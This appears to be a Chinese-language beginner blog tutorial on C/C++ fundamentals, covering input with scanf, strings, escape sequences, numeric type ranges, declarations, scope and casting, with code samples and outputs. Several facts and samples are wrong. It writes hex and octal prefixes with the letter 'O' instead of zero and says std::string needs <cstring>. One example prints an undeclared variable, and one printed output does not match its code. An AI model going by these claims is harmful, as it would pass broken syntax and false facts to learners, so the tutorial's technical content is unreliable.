class="string">&quot;%d&quot;</span>, &amp;a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;enter an long int: &quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%ld&quot;</span>, &amp;b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;enter an float: &quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%f&quot;</span>, &amp;c);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n your enter.... \n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;int a =%d \n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;long int b =%ld \n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;float c =%f&quot;</span>, c);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;	</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

 #### 如果設int >>10，long int>>1.11
 #### 則float會直接將長整數的0.11拿過來

    輸出結果
     enter an int: 10
     enter an long int: 1.11
     enter an float:
     your enter.....
     int a =10
     long int b=1
     float c=0.110000

string 字串
===

#### C因為要精簡編譯器，SO沒有string型態，所有字串處理都要使用字元陣列
#### C++新增string型態
`在使用前都要包含cstring巨集`
### string 範例程式
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    string a;</span><br><span class="line">    cin &gt;&gt; a;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;a=&quot;</span> &lt;&lt;a;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
##### 兩個程式比對一下輸出結果na~~
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    string b;</span><br><span class="line">    <span class="built_in">getline</span>(cin,b);</span><br><span class="line">    cout &lt;&lt; a&lt;&lt;endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;b=&quot;</span> &lt;&lt;b ;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//若要輸入含空白字串，則要使用getline()函式</span></span><br></pre></td></tr></table></figure>
    若輸入HI HO
    輸出結果
    a = HI
    b = HI HO
跳脫字元(Escape Sequence)
===


#### 字元中的單引號(')、雙引號(")及反斜線(\)均有定義功能

#### 若一定要使用這些字元，使用前須加反斜線(\)跳脫定義功能
_______________________
字元     | 跳脫字元序列
|:------:|:-----------:|
單引號   |  \ \'
雙引號   |  \ \"
反斜線   |  \ \\   
## 範例程式

<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">   string a= <span class="string">&quot;HI&quot;</span> ;</span><br><span class="line">   cout &lt;&lt; <span class="string">&quot;a=&quot;</span> &lt;&lt;a&lt;&lt;endl;</span><br><span class="line">   string b= <span class="string">&quot;\&quot;HI\&quot;&quot;</span> ;</span><br><span class="line">   cout &lt;&lt;<span class="string">&quot;b=&quot;</span> &lt;&lt;b&lt;&lt;endl;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
    輸出結果
    a=HI
    b="HI"

資料分類與型態
===
`下面整理C/C++語言數值資料型態，unsigned表示無號整數、即非負整數`

| 數值資料型態 | 占用記憶體大小 | 代表的數值範圍|
|:------:|:-----------:|:-----------:|
 short          |        16            | -32768 ~ +32767
 int            |        16            | -32768 ~ +32767
 long           |        32            | -2147483648 ~ +2147483647
 unsigned short |        16            | 0 ~ 65535
 unsigned int   |        16            | 0 ~ 65535
 unsigned long  |        32            | 0 ~ 4294967295
 float          |        32            | 大約3.4E-38 ~ 3.4E+38(負數亦同)
 double         |        64            | 大約1.7E-308 ~ 1.7E+308(負數亦同)
long double     |        80            | 大約3.4E-4932 ~ 3.4E+4932(負數亦同)

## 資料分類
### int(Integerts整數常數)的三種進位方式
* 十進位(Decimal)
* 十六進位(Hexadecimal)，<font color="#f11">以OX、Ox開頭</font>
* 八進位(Octal)，<font color="#f11">以O開頭</font>

<ul>
<li>OxA、OXB等類的均為16進制</li>
<li>11、12等等的一般書寫數字方式為10進位</li>
<li>O72則為8進位</li>
</ul>
<p><strong>可使用<font color="#f11">signed(有號)、unsigned(無號)</font>的short、int、long等的六種型態儲存整數</strong></p>
<blockquote>
<p><code>整數預設型態是16bits的int型態</code></p>
<hr>
<h3 id="float-Floating-poing-literals浮點常數"><a href="#float-Floating-poing-literals浮點常數" class="headerlink" title="float(Floating-poing literals浮點常數)"></a>float(Floating-poing literals浮點常數)</h3><p><font color="#f11">數字中含有小數點或指數的稱為浮點數</font><br>以指數為例E、e表示10的次方<br>例如0.0023、2.3E-3、2.3e-3都是表示相同的浮點數或是2.3E+2&gt;&gt;230<br>浮點數可使用標準書寫&gt;&gt;24.101、1.123<br>科學符號&gt;&gt;2.3E+1、2.01e-4</p>
</blockquote>
<p><strong>可以使用float、double、long double三種型態儲存浮點數常數</strong></p>
<h4 id="double是浮點數預設值，若要使用float，則應該要在數值後加上F、f"><a href="#double是浮點數預設值，若要使用float，則應該要在數值後加上F、f" class="headerlink" title="double是浮點數預設值，若要使用float，則應該要在數值後加上F、f"></a><font color="#f11">double是浮點數預設值</font>，若要使用float，則應該要在數值後加上F、f</h4><ul>
<li>例如: double = 1.414，float = 1.414f <h4 id="而要用long-double應在數值後加L、l"><a href="#而要用long-double應在數值後加L、l" class="headerlink" title="而要用long double應在數值後加L、l"></a>而要用long double應在數值後加L、l</h4></li>
<li>例如: long double = 1.414L</li>
</ul>
<hr>
<h3 id="char-character-literals字元常數-，使用單引號-‘-圍住的-單一字元"><a href="#char-character-literals字元常數-，使用單引號-‘-圍住的-單一字元" class="headerlink" title="char(character literals字元常數)，使用單引號(‘)圍住的!!單一字元!!"></a>char(character literals字元常數)，使用單引號(‘)圍住的!!單一字元!!</h3><h4 id="例如’A’、’a’等"><a href="#例如’A’、’a’等" class="headerlink" title="例如’A’、’a’等"></a>例如’A’、’a’等</h4><blockquote>
<p><strong><em>C/C++使用bits的ASCII，可表示256個字元包含<font color="#f11">大小寫英文字母、數字、標點符號、其他特殊符號</font></em></strong><br><strong>char型態是8位元長</strong></p>
<hr>
</blockquote>
<h3 id="String-字串"><a href="#String-字串" class="headerlink" title="String(字串)"></a>String(字串)</h3><h4 id="字串以雙引號”-“圍住"><a href="#字串以雙引號”-“圍住" class="headerlink" title="字串以雙引號” “圍住"></a>字串以雙引號” “圍住</h4><blockquote>
<p>例如:”HI”、”你好”</p>
</blockquote>
<h5 id="因C沒有字串型態，所以字串的使用要用字元陣列而C-新增string使用前要新增-include-lt-cstring-gt"><a href="#因C沒有字串型態，所以字串的使用要用字元陣列而C-新增string使用前要新增-include-lt-cstring-gt" class="headerlink" title="因C沒有字串型態，所以字串的使用要用字元陣列而C++新增string使用前要新增#include&lt;cstring&gt;"></a>因C沒有字串型態，所以字串的使用要用字元陣列而C++新增string使用前要新增<code>#include&lt;cstring&gt;</code></h5><hr>
<h3 id="Boolean-布林值"><a href="#Boolean-布林值" class="headerlink" title="Boolean(布林值)"></a>Boolean(布林值)</h3><h4 id="使用1代表True、0代表False"><a href="#使用1代表True、0代表False" class="headerlink" title="使用1代表True、0代表False"></a><code>使用1代表True、0代表False</code></h4><font color="#f11">**布林型態是bool**</font>

<h1 id="變數宣告"><a href="#變數宣告" class="headerlink" title="變數宣告"></a>變數宣告</h1><h4 id="變數的功能是用來輸入、處理、儲存外界資料"><a href="#變數的功能是用來輸入、處理、儲存外界資料" class="headerlink" title="變數的功能是用來輸入、處理、儲存外界資料"></a><code>變數的功能是用來輸入、處理、儲存外界資料</code></h4><p><strong>變數在使用前要<font color="#f11">事先宣告</font>才能用</strong></p>
<blockquote>
<p>若變數未宣告的結果，編譯器便無法回應使用者在拼字上的錯誤，造成除錯的困難[color=#902bd9]</p>
<blockquote>
<p>hi = hi +1;<br>上式若事先宣告hi<br>int hi;<br>沒宣告則編譯器遇到hi時，便會出現 hi 未宣告的錯誤訊息<br><strong>變數宣告的優點是可配置恰當的記憶體而提高資料的處理</strong>效率[color=#901f7561]</p>
<hr>
<h2 id="C-C-變數宣告語法如下"><a href="#C-C-變數宣告語法如下" class="headerlink" title="C/C++變數宣告語法如下"></a>C/C++變數宣告語法如下</h2><pre><code>資料型態 變數名稱 [=初值];
</code></pre><ul>
<li>int      a; <code>宣告變數 a 為int型態</code></li>
<li>char     b,c; <code>宣告變數b,c為char型態</code><br><strong>變數宣告亦可連同初值一同設定</strong><ul>
<li>float e=1.1f; <code>宣告變數 e 為float型態</code></li>
<li>char  r=’n’;  <code>宣告變數 r為 char型態，初值為n</code> </li>
</ul>
</li>
</ul>
</blockquote>
</blockquote>
<h3 id="這段程式宣告bool型態"><a href="#這段程式宣告bool型態" class="headerlink" title="這段程式宣告bool型態"></a>這段程式宣告bool型態</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">bool</span> g,v;</span><br><span class="line">    g = <span class="number">4</span>&gt;<span class="number">2</span>;  <span class="comment">// 1 &gt;&gt; True</span></span><br><span class="line">    cout &lt;&lt;g&lt;&lt;endl;</span><br><span class="line">    v = <span class="number">4</span>&lt;<span class="number">3</span>; <span class="comment">// 0 &gt;&gt;False</span></span><br><span class="line"></span><br><span class="line">    cout &lt;&lt;v&lt;&lt;endl;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">sizeof</span>(v); <span class="comment">//記憶體大小</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<pre><code>輸出結果
1
0
1
</code></pre><hr>
<h3 id="C沒有字串型態要使用字串則要使用指標或字元陣列"><a href="#C沒有字串型態要使用字串則要使用指標或字元陣列" class="headerlink" title="C沒有字串型態要使用字串則要使用指標或字元陣列"></a>C沒有字串型態要使用字串則要使用指標或字元陣列</h3><p><strong>下列程式使用指標處理字串</strong><br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">char</span> *a=<span class="string">&quot;abcd&quot;</span>;</span><br><span class="line"><span class="type">char</span> *t;</span><br><span class="line">t=<span class="string">&quot;qwer&quot;</span>;</span><br><span class="line">cout&lt;&lt;a&lt;&lt;endl;<span class="comment">//abcd</span></span><br><span class="line">cout&lt;&lt;t&lt;&lt;endl;<span class="comment">//qwer</span></span><br><span class="line">a =<span class="string">&quot;ok&quot;</span>;</span><br><span class="line">cout &lt;&lt; a&lt;&lt;endl;</span><br><span class="line">a=t;<span class="comment">//qwer</span></span><br><span class="line">cout &lt;&lt;a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>    輸出結果<br>    abcd<br>    qwer<br>    ok<br>    qwer</p>
<hr>
<p><strong>C++新增string型態</strong><br><code>可宣告變數b為字串型態</code><br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  string b;</span><br><span class="line">  b =<span class="string">&quot;QAQ&quot;</span>;</span><br><span class="line">  cout &lt;&lt;b;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>    輸出結果<br>    QAQ</p>
<h2 id="範例程式"><a href="#範例程式" class="headerlink" title="範例程式"></a>範例程式</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> hi=<span class="number">0</span>;</span><br><span class="line">    hi = hi + <span class="number">1</span> ;</span><br><span class="line">    cout &lt;&lt;hi&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    <span class="type">char</span> *K;</span><br><span class="line">    <span class="type">char</span> *N;</span><br><span class="line">    K =<span class="string">&quot;OH&quot;</span>;</span><br><span class="line">    N =<span class="string">&quot;YA&quot;</span>;</span><br><span class="line">    string S;</span><br><span class="line">    S = <span class="string">&quot;HAHAHA&quot;</span>;</span><br><span class="line">    cout &lt;&lt; K&lt;&lt;endl;</span><br><span class="line">    cout &lt;&lt; N&lt;&lt;endl;</span><br><span class="line">    cout &lt;&lt; S;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<pre><code>  輸出結果
  1
  OH
  YA
  HAHAHA
</code></pre><h4 id="下面的程式碼出了許多錯誤，嘗試排錯先，再看答案-smiling-face-with-smiling-eyes-and-hand-covering-mouth"><a href="#下面的程式碼出了許多錯誤，嘗試排錯先，再看答案-smiling-face-with-smiling-eyes-and-hand-covering-mouth" class="headerlink" title="下面的程式碼出了許多錯誤，嘗試排錯先，再看答案 :smiling_face_with_smiling_eyes_and_hand_covering_mouth:"></a>下面的程式碼出了許多錯誤，嘗試排錯先，再看答案 :smiling_face_with_smiling_eyes_and_hand_covering_mouth:</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> hihi123;</span><br><span class="line">    <span class="type">int</span> _a;</span><br><span class="line">    <span class="type">int</span> %as;</span><br><span class="line">    <span class="type">int</span> sum! ;</span><br><span class="line">    <span class="type">int</span> Age#<span class="number">3</span>;</span><br><span class="line">    <span class="type">int</span> a c;</span><br><span class="line">    <span class="type">int</span> c + <span class="number">3</span>;</span><br><span class="line">    <span class="type">int</span> Score;</span><br><span class="line">    score =<span class="number">4</span>;</span><br><span class="line">    <span class="type">int</span> <span class="keyword">if</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="找到錯誤了嗎-serious-face-with-symbols-covering-mouth"><a href="#找到錯誤了嗎-serious-face-with-symbols-covering-mouth" class="headerlink" title="找到錯誤了嗎? :serious_face_with_symbols_covering_mouth:"></a>找到錯誤了嗎? :serious_face_with_symbols_covering_mouth:</h4><p><code>下面是排錯後der程式</code><br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> hihi123;</span><br><span class="line">    <span class="type">int</span> _a;</span><br><span class="line">    <span class="type">int</span> as;<span class="comment">//不能由符號開頭</span></span><br><span class="line">    <span class="type">int</span> sum;<span class="comment">//不可有!</span></span><br><span class="line">    <span class="type">int</span> Age3;<span class="comment">//不可有#</span></span><br><span class="line">    <span class="type">int</span> a,c;<span class="comment">//不可空白</span></span><br><span class="line">    <span class="type">int</span> c; <span class="comment">//不得含有加號</span></span><br><span class="line">    <span class="type">int</span> Score;</span><br><span class="line">    Score =<span class="number">4</span>; <span class="comment">//大小寫錯誤</span></span><br><span class="line">    <span class="type">int</span> hi; <span class="comment">//if是保留字</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="常數符號的宣告"><a href="#常數符號的宣告" class="headerlink" title="常數符號的宣告"></a>常數符號的宣告</h1><p><strong><code>常數符號需要記憶體儲存位置，與變數不同的是常數在整個程式中都不會也不會改變其值</code></strong></p>
<h3 id="程式設計有兩種表示常數的方式"><a href="#程式設計有兩種表示常數的方式" class="headerlink" title="程式設計有兩種表示常數的方式"></a>程式設計有兩種表示常數的方式</h3><blockquote>
<p><strong>文字式(Literal)</strong>:直接以15或3.14表示某一常數[color=#a01d7961]</p>
<p><strong>常數符號式(Symbolic)</strong>:因有些數字在程式中會不斷重複出現，為了增加程式可讀性及減少程式鍵入麻煩，此時可以用有意義的符號代替這就是<strong>常數符號宣告</strong>[color=#509f7349]</p>
</blockquote>
<h4 id="C語言常數定義語法"><a href="#C語言常數定義語法" class="headerlink" title="C語言常數定義語法"></a>C語言常數定義語法</h4><p><code>#define  常數名稱  常數值</code></p>
<h4 id="C-則新增了const宣告常數"><a href="#C-則新增了const宣告常數" class="headerlink" title="C++則新增了const宣告常數"></a>C++則新增了const宣告常數</h4><p><code>const 型態 常數名稱=常數值;</code></p>
<h2 id="範例程式-1"><a href="#範例程式-1" class="headerlink" title="範例程式"></a>範例程式</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIE 3.14 <span class="comment">//常數符號通常用大寫表示</span></span></span><br><span class="line"><span class="type">const</span> <span class="type">double</span> PI=<span class="number">100</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">double</span> a,b;</span><br><span class="line">    a=<span class="number">3</span>*<span class="number">3</span>*PIE; <span class="comment">//3*3*3.14</span></span><br><span class="line">    b=<span class="number">5</span>*<span class="number">5</span>*PI; <span class="comment">// 5*5*100</span></span><br><span class="line">    cout&lt;&lt;a&lt;&lt;endl&lt;&lt;b;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<pre><code>輸出結果
28.26
2500
</code></pre><h1 id="變數常數有效範圍"><a href="#變數常數有效範圍" class="headerlink" title="變數常數有效範圍"></a>變數常數有效範圍</h1><p><strong><code>在一個大型程式中，一個程式是由一或數個函式組合而成
為了防止變數互相干擾，才有變數的有效範圍</code></strong></p>
<h4 id="變數有效範圍如下-gt-gt"><a href="#變數有效範圍如下-gt-gt" class="headerlink" title="變數有效範圍如下&gt;&gt;"></a>變數有效範圍如下&gt;&gt;</h4><blockquote>
<p>任一變數的宣告，若無特殊聲明，均屬於<font color="#f11"><strong>區域變數</strong></font>，有效範圍僅止於<font color="#f11">該變數所在程式區塊</font><br>:::info<br>例如:<br>宣告在敘述區塊，則它的有效範圍僅止於該敘述區塊，別的敘述區塊是無法取得該區域變數的值</p>
</blockquote>
<p>若宣告於函式中，則它的有效範圍僅止於該函式，其他函式均無法取得該區域變數的值<br>:::</p>
<p>:::spoiler<br>EX:<br>全域的a有效範圍是main()、aa()、bb()等全部函式<br>b、c的有效範圍則是main()、aa()中c、d有效範圍是aa()，但此c與main()中的c只是同名，他們各自占有不同記憶體，且其值<font color="#a09">不會互相干擾</font></p>
<p>其次，bb()中的a是全域a，與main共用a，在bb()內的改變會傳回main();for敘述區塊內又宣告a，則此a僅在for內有效不會改變全域的a<br>但若在for敘述區塊中未宣告a，而誤用a，則a會改變全域的a;if敘述區塊也宣告a，則a僅在if內有效，不改變全域a<br>:::</p>
<p><code>感覺看懂嘞對ㄅ
再來看程式碼吧!</code></p>
<h4 id="範例程式1"><a href="#範例程式1" class="headerlink" title="範例程式1"></a>範例程式1</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">//int double PI=3.14;//全域常數</span></span><br><span class="line"><span class="type">int</span> a;<span class="comment">//全域a</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">aa</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">bb</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="type">int</span> b,c;</span><br><span class="line">    a=<span class="number">10</span>;<span class="comment">//全域a</span></span><br><span class="line">    c=<span class="number">5</span>;<span class="comment">//main內c</span></span><br><span class="line">    <span class="built_in">aa</span>();</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;2.main的c=&quot;</span>&lt;&lt;c&lt;&lt;endl;</span><br><span class="line">    <span class="built_in">bb</span>();</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;3.全域a=&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> a=<span class="number">2</span>;a&lt;=<span class="number">3</span>;a++)</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;4.for內的a=&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;5.for內的a=&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(a=<span class="number">2</span>;a&lt;=<span class="number">3</span>;a++)<span class="comment">//誤用</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;6.for內的a=&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;7.for內的a=&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">if</span>(c&gt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="type">int</span> a;</span><br><span class="line">        a=<span class="number">1</span>;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;8.if內a=&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;9.for內的a=&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">aa</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> c,d;</span><br><span class="line">    c=<span class="number">3</span>;<span class="comment">//aa內的C</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;1.aa內的c=&quot;</span>&lt;&lt;c&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">bb</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    a=<span class="number">8</span>;<span class="comment">//全域a</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<pre><code>輸出結果
1.aa der c=3
2.main der c=5
3.global variable a=8
4.for der a=2
4.for der a=3
5.for der a=8
6.for der a=2
6.for der a=3
7.for der a=4
8.if der a=1
9.for der Ba=4
</code></pre><h4 id="範例程式2-1"><a href="#範例程式2-1" class="headerlink" title="範例程式2"></a>範例程式2</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> a=<span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">aa</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;1.a=&quot;</span>&lt;&lt;a&lt;&lt;endl;<span class="comment">//1</span></span><br><span class="line">    <span class="type">int</span> a=<span class="number">2</span>;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;2.a=&quot;</span>&lt;&lt;a&lt;&lt;endl;<span class="comment">//2</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">bb</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;4.a=&quot;</span>&lt;&lt;a&lt;&lt;endl;<span class="comment">//1</span></span><br><span class="line">    a=<span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">aa</span>();</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;3.a=&quot;</span>&lt;&lt;a&lt;&lt;endl;<span class="comment">//1</span></span><br><span class="line">    <span class="built_in">bb</span>();</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;5.a=&quot;</span>&lt;&lt;a&lt;&lt;endl;<span class="comment">//3</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<pre><code>輸出結果
1.a=1
2.a=2
3.a=1
4.a=1
5.a=3
</code></pre><h1 id="變數資料型態轉換"><a href="#變數資料型態轉換" class="headerlink" title="變數資料型態轉換"></a>變數資料型態轉換</h1><p><code>每個變數宣告後，即有屬於自己的型態，往後此變數均只能給相同型態變數儲存
若執行階段指定給不同型態的變數儲存，則稱此為型態轉換</code></p>
<h4 id="C-C-語言中型態轉換又可分為"><a href="#C-C-語言中型態轉換又可分為" class="headerlink" title="==C/C++語言中型態轉換又可分為=="></a>==C/C++語言中型態轉換又可分為==</h4><h4 id="隱含轉換-Implicit-Conversion-與強制轉換-Explicit-Conversion"><a href="#隱含轉換-Implicit-Conversion-與強制轉換-Explicit-Conversion" class="headerlink" title="隱含轉換(Implicit Conversion)與強制轉換(Explicit Conversion)"></a><font color="#c153">隱含轉換(Implicit Conversion)與強制轉換(Explicit Conversion)</font></h4><h3 id="隱含轉換"><a href="#隱含轉換" class="headerlink" title="隱含轉換"></a>隱含轉換</h3><p><code>將值域小的型態轉為值域大的型態，稱為自動轉換或轉型(Convert)</code><br><strong><font color="#a13">此種轉換系統可以自動處理並確保資料不會流失</font></strong></p>
<h5 id="將short轉為long，因後者的值域比前者大，所以可順利轉換"><a href="#將short轉為long，因後者的值域比前者大，所以可順利轉換" class="headerlink" title="==將short轉為long，因後者的值域比前者大，所以可順利轉換=="></a>==將short轉為long，因後者的值域比前者大，所以可順利轉換==</h5><p><code>下列敘述可將型態為long的變數a指派給型態long的變數b，且原值不會改變</code></p>
<blockquote>
<p>short a=23;<br>long b;<br>b=a;<br>cout&lt;&lt;b;<br>結果是23<br>[color=#a95]</p>
</blockquote>
<h3 id="強制轉換"><a href="#強制轉換" class="headerlink" title="強制轉換"></a>強制轉換</h3><p><code>將值域大的轉為值域小的型態，稱為強制轉換或稱鑄型(Cast)</code>，語法如下</p>
<blockquote>
<p><strong>變數1 = (變數1的型態) 變數2;</strong>[color=#b54178]</p>
</blockquote>
<h5 id="以下敘述可將型態是int的c變數指派給型態是short的d變數"><a href="#以下敘述可將型態是int的c變數指派給型態是short的d變數" class="headerlink" title="以下敘述可將型態是int的c變數指派給型態是short的d變數"></a>以下敘述可將型態是int的c變數指派給型態是short的d變數</h5><blockquote>
<p>int c=23;<br>short d;<br>d=(short) c;<br>cout&lt;&lt;d;<br>結果是23[color=#a19]</p>
</blockquote>
<p><font color="#a09">強制轉換的風險大，可能導致資料流失或溢位</font></p>
<h5 id="以下是將float型態強制轉換為short型態，將造成小數部分流失"><a href="#以下是將float型態強制轉換為short型態，將造成小數部分流失" class="headerlink" title="以下是將float型態強制轉換為short型態，將造成小數部分流失"></a>以下是將float型態強制轉換為short型態，將造成小數部分流失</h5><blockquote>
<p>float e=3.4f;<br>short f;<br>f=(short) e;<br>cout&lt;&lt;f;<br>結果是3[color=#e54]</p>
</blockquote>
